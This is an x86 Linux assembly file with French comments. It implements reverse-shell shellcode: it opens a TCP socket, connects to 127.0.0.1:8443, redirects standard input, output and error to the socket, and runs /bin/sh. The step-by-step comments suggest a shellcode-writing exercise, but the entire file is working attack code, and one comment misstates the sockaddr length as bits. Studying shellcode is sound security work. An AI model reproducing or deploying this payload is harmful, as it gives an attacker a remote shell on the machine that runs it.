; version 0.1
; 01/02/2022

section .text
	global _start

_start:

; creation du socket
; pour creer un socket il faut utiliser un appel système appeler "socket call"
; d'après le man 2 socket call, il faut placer 1 dans l'argument SYS_SOCKET
; nous utiliserons al et bl pour l'optimisation
; les valeurs 0x66 et 0x1 necessitent moins d'un octet donc un registre low

	; appel systeme
	xor eax, eax 		; clean eax
	mov al, 0x66 		; placer 102 en hex dans al pour l'appel système socketcall 

	xor ebx, ebx 		; clean ebx
	mov bl, 0x1 		; placer 1 dans bl en tant qu'argument pour SYS_SOCKET 

	; preciser le protocole, le type et le domain sur la stack
	xor ecx, ecx 		; clean ecx
	push ecx		; push sur la stack le protocol = 0
	push 0x1		; type = 1, SOCK_STREAM, donc flux en full duplex avec controle = TCP 
	push 0x2		; domain = 2, AF_INET, donc protocole IPv4
	
	; pointe le haut de la stack dans ecx
	; donc ecx pointe vers toute la stack précédente
	mov ecx, esp

	int 0x80 		; interruption systeme

; connexion du socket au système distant
; nous utiliserons la fonction SYS_CONNECT de l'appel système socketcall
	
	; file descriptor
	xor edx, edx		; clean edx
	mov edx, eax 		;

	mov al, 0x66		; 0x66 = 102 pour le syscall socketcall

	mov bl, 0x3		; argument à 3 pour appeler SYS_CONNECT

	; structure de la stack
	xor ecx, ecx		; clean ecx
	push 0x0100007f		; donne l'adresse ip 127.0.0.1 à placer à l'envers 1.0.0.127
	push word 0xfb20	; port 8443
	push word 0x2		; famille d'adresse = AF_INET donc IPv4
	
	mov esi, esp		; 
	
	push 0x10		; 0x10 = 16 précise la taille de l'argument port au dessus en nombre de bits
	push esi
	push edx		; file descriptor retourné du syscall socket

	mov ecx, esp
	int 0x80

; redirigeons STDIN, STDOUT et STDERR vers le file descriptor socket precedemment créé
; 	
; dupliquer les files descriptors

;dup2 STDIN
	mov al, 0x3f		; 0x3f = 63 syscall de dup2
	mov ebx, edx
	xor ecx, ecx
	int 0x80

; dup2 STDOUT
	mov al, 0x3f
	mov cl, 0x1		; 0x1 = 1 car le file descriptor de STDOUT est 1
	int 0x80

; dup2 STDERR
	mov al, 0x3f
	mov cl, 0x2		; 0x2 = 2 car le file descriptor de STDERR est 2
	int 0x80

; execution de /bin/sh
	mov al, 0xb

	xor ebx, ebx
	push ebx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp

	xor ecx, ecx
	xor edx, edx

	int 0x80 

